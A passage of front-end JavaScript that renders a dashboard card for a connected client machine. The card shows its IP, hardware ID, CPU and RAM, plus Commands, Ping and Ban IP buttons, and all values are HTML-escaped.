        <div class="cv-user-line cv-mono"><i class="fa-solid fa-user"></i> ${escapeHtml(userLine)}${showHost ? ` <span class="cv-text-dim">@ ${escapeHtml(client.host)}</span>` : ""}</div>
        ${customTag ? `<div class="cv-card-tag"><i class="fa-solid fa-tag"></i> ${escapeHtml(customTag)}</div>` : ""}
        <div class="cv-card-net">
          ${client.ip ? `<span class="cv-card-net-bit"><i class="fa-solid fa-network-wired"></i> <span class="cv-mono">${escapeHtml(client.ip)}</span></span>` : ""}
          ${hwidShort ? `<span class="cv-card-net-bit"><i class="fa-solid fa-fingerprint"></i> <span class="cv-mono">${escapeHtml(hwidShort)}</span></span>` : ""}
        </div>
        <div class="cv-card-meta">
          ${metaParts}
          ${hasGroup ? `<span class="cv-group-spacer">${groupPillHtml(client)}</span>` : ""}
        </div>
        ${cpuShort || client.ram ? `<div class="cv-card-hw">
          ${cpuShort ? `<span class="cv-card-hw-bit" title="${escapeHtml(client.cpu)}"><i class="fa-solid fa-microchip"></i> ${escapeHtml(cpuShort)}</span>` : ""}
          ${client.ram ? `<span class="cv-card-hw-bit"><i class="fa-solid fa-memory"></i> ${escapeHtml(client.ram)}</span>` : ""}
        </div>` : ""}
        <div class="cv-card-actions">
          ${isViewer ? "" : `<button class="command-btn cv-btn-primary cv-btn-flex" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-terminal"></i><span>Commands</span></button>`}
          <button class="cv-icon-btn cv-ping-btn" title="Ping" ${client.online ? "" : "disabled"}><i class="fa-solid fa-satellite-dish"></i></button>
          ${isViewer ? "" : `<button class="cv-icon-btn cv-icon-danger ban-btn" title="Ban IP" data-id="${escapeHtml(client.id)}"><i class="fa-solid fa-ban"></i></button>`}
        </div>
      </div>
    `;
    return article;
  }

  return { renderMerge, setLayout };
}
